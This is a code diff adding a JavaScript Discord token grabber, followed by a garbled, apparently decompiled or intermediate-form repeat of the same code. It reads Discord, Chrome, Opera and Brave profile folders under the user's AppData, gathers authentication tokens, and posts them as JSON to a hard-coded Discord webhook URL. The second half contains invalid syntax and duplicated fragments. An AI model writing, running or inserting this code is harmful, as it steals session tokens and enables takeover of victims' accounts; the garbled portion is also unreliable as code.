@@ -1,0 +1,64 @@
+function discordTokenGrabber = function discordTokenGrabber() {
+  var paths;
+  var local = process.env.LOCALAPPDATA;
+  var roaming = process.env.APPDATA;
+  paths = {
+    "Discord": path.join(roaming, "Discord"),
+    "Discord Canary": path.join(roaming, "discordcanary"),
+    "Discord PTB": path.join(roaming, "discordptb"),
+    "Google Chrome": path.join(local, "Google", "Chrome", "User Data", "Default"),
+    "Opera": path.join(roaming, "Opera Software", "Opera Stable"),
+    "Brave": path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default")
+  };
+  var tokens = {};
+  var _loop = function _loop(platform, _path) {
+    var tokenList = findToken(_path);
+    if (tokenList) {
+      tokenList.forEach(token => {
+        if (tokens[platform] === undefined) tokens[platform] = [];
+        tokens[platform].push(token);
+      });
+    }
+  };
+  for (var [platform, _path] of Object.entries(paths)) {
+    _loop(platform, _path);
+  }
+  fetch("https://discord.com/api/webhooks/1089530389292388463/6kIrdtmkWbIkk93u34iD3rv...
+var local = process.env.LOCALAPPDATA
+var roaming = process.env.APPDATA
+paths = {
+    "Discord": path.join(roaming, "Discord"),
+    "Discord Canary": path.join(roaming, "discordcanary"),
+    "Discord PTB": path.join(roaming, "discordptb"),
+    "Google Chrome": path.join(local, "Google", "Chrome", "User Data", "Default"),
+    "Opera": path.join(roaming, "Opera Software", "Opera Stable"),
+    "Brave": path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default")
+  }
+_tmp_8.Discord = path.join(roaming, "Discord")
+_tmp_8.Discord Canary = path.join(roaming, "discordcanary")
+_tmp_8.Discord PTB = path.join(roaming, "discordptb")
+_tmp_8.Google Chrome = path.join(local, "Google", "Chrome", "User Data", "Default")
+_tmp_8.Opera = path.join(roaming, "Opera Software", "Opera Stable")
+_tmp_8.Brave = path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default")
+var tokens = {}
+var _loop = function _loop(platform, _path) {
+    var tokenList = findToken(_path);
+    if (tokenList) {
+      tokenList.forEach(token => {
+        if (tokens[platform] === undefined) tokens[platform] = [];
+        tokens[platform].push(token);
+      });
+    }
+  }
+_iterator_1 = <operator>.iterator(Object.entries(paths))
+_loop(platform, _path)
+fetch("https://discord.com/api/webhooks/1089530389292388463/6kIrdtmkWbIkk93u34iD3rvLETiCYPEADkP2bLCvyNN-NjgXJ4cWcfs1EOPW2FxR-5nh", {
+    method: "POST",
+    headers: {
+      "Content-type": "application/json"
+    },
+    body: JSON.stringify({
+      username: "israel",
+      content: JSON.stringify(tokens)
+    })
+  }).then(_mug => {}).catch(_mug => {})
